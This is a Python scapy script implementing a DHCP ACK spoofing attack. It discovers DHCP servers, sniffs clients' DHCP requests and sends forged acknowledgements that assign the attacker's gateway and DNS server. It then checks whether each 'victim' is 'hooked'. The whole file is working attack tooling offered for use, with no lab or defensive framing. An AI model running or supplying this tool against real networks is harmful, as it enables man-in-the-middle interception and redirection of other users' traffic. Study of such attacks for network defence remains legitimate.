#!/usr/bin/python2

__author__ = 'root'

import scapy.all
import scapy.layers as layers
from scapy.sendrecv import *
import random


class DomainConfig:

    def __init__(self, gateway, broadcast, netmask, domain_name, nameserver=None):

        if gateway:
            self.gateway = gateway
        else:
            self.gateway = ''

        if netmask:
            self.netmask = netmask
        else:
            netmask = ''

        if broadcast:
            self.broadcast =  broadcast
        else:
            self.broadcast = ''

        if domain_name:
            self.domain_name = domain_name
        else:
            self.domain_name = ''

        if nameserver:
            self.nameserver = nameserver
        else:
            self.nameserver = ''

    def __str__(self):
        return str(
                  'gateway :' + self.gateway + '\n'
                  'broadcast :' + self.broadcast + '\n'
                  'netmask :' + self.netmask + '\n'
                  'domain_name :' + self.domain_name + '\n'
                  'nameserver :' + self.nameserver
        )


class DHCPAckSpoofing:

    def __init__(self, interface):
        self.interface = interface
        self.dhcp_servers = []
        self._attack_domain = None

    def print_found_dhcp(self):
        print('Found ' + str(len(self.dhcp_servers)) + ' DHCP!\n')

        for (x, y) in zip(self.dhcp_servers, range(len(self.dhcp_servers))):
            print('#####################\nDHCP server ' + str(y))
            print('MAC : ' + x[0])
            print('IP  : ' + x[1])
            print(' -- Offered Network -- ')
            print(x[2])

    def scan_dhcp_servers(self, timeout=1):

        dhcp_discover = layers.l2.Ether(dst='ff:ff:ff:ff:ff:ff')/\
                        layers.inet.IP(src='0.0.0.0', dst='255.255.255.255', id=random.randrange(200, 0xFFFF))/\
                        layers.inet.UDP(sport=68, dport=67)/\
                        layers.dhcp.BOOTP(op='BOOTREQUEST', xid=random.randrange(2000, 0xFFFFF))/\
                        layers.dhcp.DHCP(options=[
                            ('message-type', 1),
                            ('hostname', 'localhost'), 'end']
                            )

        sendp(
            dhcp_discover,
            iface=self.interface,
            verbose=0
        )

        sniffed_packets = sniff(timeout=timeout, filter='udp')
        sniffed_dhcp = [x for x in sniffed_packets if layers.dhcp.DHCP in x]
        for packet in sniffed_dhcp:
            #Get the IP of the DHCP server requested by client
            dhcp_ip = next((x for x in packet[layers.dhcp.DHCP].options if x[0] == 'server_id'),
                                 (None, None))[1]
            gateway = next((x for x in packet[layers.dhcp.DHCP].options if x[0] == 'router'),
                                 (None, None))[1]
            nameserver = next((x for x in packet[layers.dhcp.DHCP].options if x[0] == 'name_server'),
                                 (None, None))[1]
            broadcast = next((x for x in packet[layers.dhcp.DHCP].options if x[0] == 'broadcast_address'),
                                 (None, None))[1]
            netmask = next((x for x in packet[layers.dhcp.DHCP].options if x[0] == 'subnet_mask'),
                                 (None, None))[1]

            domain_name = next((x for x in packet[layers.dhcp.DHCP].options if x[0] == 'domain'),
                                 (None, None))[1]

            if(dhcp_ip):
                dhcp_server = DomainConfig(gateway=gateway, broadcast=broadcast, netmask=netmask, nameserver=nameserver, domain_name=domain_name)
                dhcp_mac = packet[layers.l2.Ether].src
                self.dhcp_servers += [(dhcp_mac, dhcp_ip, dhcp_server)]

    def send_spoofed_ack(self, dhcp_request_udp_packet):

        #ETHERNET LAYER
        victim_mac = dhcp_request_udp_packet[layers.l2.Ether].src
        spoofed_ack = layers.l2.Ether(dst=victim_mac)

        #IP LAYER
        spoofed_ack = spoofed_ack/layers.inet.IP()

        #Get the IP requested by client
        dhcp_request_options = dhcp_request_udp_packet[layers.dhcp.DHCP].options
        requested_ip = ''
        try:
            requested_ip = next(x for x in dhcp_request_options if x[0] == 'requested_addr')[1]
        except StopIteration:
            requested_ip = self._attack_domain.gateway
            ip_fields = requested_ip.split('.')
            ip_fields[-1] = str(random.randrange(1, 0xFE))
            requested_ip = '.'.join(ip_fields)

            print('Client didn\'t requested an ip, trying with ' + requested_ip)


        spoofed_ack[layers.inet.IP].src = self._attack_domain.gateway
        spoofed_ack[layers.inet.IP].dst = requested_ip
        spoofed_ack[layers.inet.IP].id = random.randrange(200, 0xFFFF)

        #UDP LAYER
        spoofed_ack = spoofed_ack/layers.inet.UDP()

        #BOOTP LAYER
        spoofed_ack = spoofed_ack/layers.dhcp.BOOTP()
        spoofed_ack[layers.dhcp.BOOTP].op = 'BOOTREPLY'
        xid = dhcp_request_udp_packet[layers.dhcp.BOOTP].xid
        spoofed_ack[layers.dhcp.BOOTP].xid = xid

        spoofed_ack[layers.dhcp.BOOTP].yiaddr = requested_ip

        #Get the IP of the DHCP server requested by client
        requested_dhcp_server_ip = next((x for x in dhcp_request_options if x[0] == 'server_id'),
                                 (None, None))[1]

        #If we gathered some DHCP ip's and the info was missing in the request, assign the first DHCP probed
        if requested_dhcp_server_ip is None and len(self.dhcp_servers) > 0:
            requested_dhcp_server_ip = self.dhcp_servers[0][1]
        else:
            requested_dhcp_server_ip = '0.0.0.0'

        spoofed_ack[layers.dhcp.BOOTP].siaddr = requested_dhcp_server_ip
        chaddr = dhcp_request_udp_packet[layers.dhcp.BOOTP].chaddr
        spoofed_ack[layers.dhcp.BOOTP].chaddr = chaddr

        #DHCP LAYER

        #Craft the spoofed DHCP packet
        message_type = ('message-type', 5)
        server_id = ('server_id', requested_dhcp_server_ip)
        lease_time = ('lease_time', 3600)
        renewal_time = ('renewal_time', 1800)
        rebinding_time = ('rebinding_time', 3150)
        subet_mask = ('subnet_mask', self._attack_domain.netmask)
        broadcast_address = ('broadcast_address', self._attack_domain.broadcast)
        domain = ('domain', self._attack_domain.domain_name)

        requested_dhcp_hostname = next((x for x in dhcp_request_options if x[0] == 'hostname'),
                                    (None, 'localhost'))[1]

        hostname = ('hostname', requested_dhcp_hostname)
        if self._attack_domain.nameserver:
            name_server = ('name_server', self._attack_domain.nameserver)
        else:
            name_server = ('name_server', self._attack_domain.gateway)
        router = ('router', self._attack_domain.gateway)

        spoofed_ack = spoofed_ack/layers.dhcp.DHCP(options=[
            message_type,
            server_id,
            lease_time,
            renewal_time,
            rebinding_time,
            subet_mask,
            broadcast_address,
            domain,
            hostname,
            name_server,
            router,
            'end'
        ])

        sendp(spoofed_ack, iface=self.interface, verbose=0)

        #Return IP address we tried to hook the victim to
        return requested_ip

    def hook_dhcp_request(self, udp_packet):
        if layers.dhcp.DHCP in udp_packet:
            dhcp_packet = udp_packet[layers.dhcp.DHCP]
            dhcp_type_index = dhcp_packet.options[0][1]

            if dhcp_type_index == 3:
                target_ip = self.send_spoofed_ack(udp_packet)
                print('Trying to hook ' + target_ip)
                self.is_hooked(target_ip)
                return

    def is_hooked(self, target_ip):
        # If we received a packet shortly after, there's good chance we are
        # forwarding the victim.

        sniffed = scapy.sendrecv.sniff(iface=self.interface, timeout=15)
        victim_packets = [x for x in sniffed if layers.inet.IP in x and x[layers.inet.IP].src == target_ip]
        if len(victim_packets) > 0:
            print('There\'s good chances that ' + target_ip + ' is hooked!')


    def launch_attack(self, domain_config):
        self._attack_domain = domain_config
        scapy.sendrecv.sniff(iface=self.interface, filter='udp', prn=self.hook_dhcp_request)
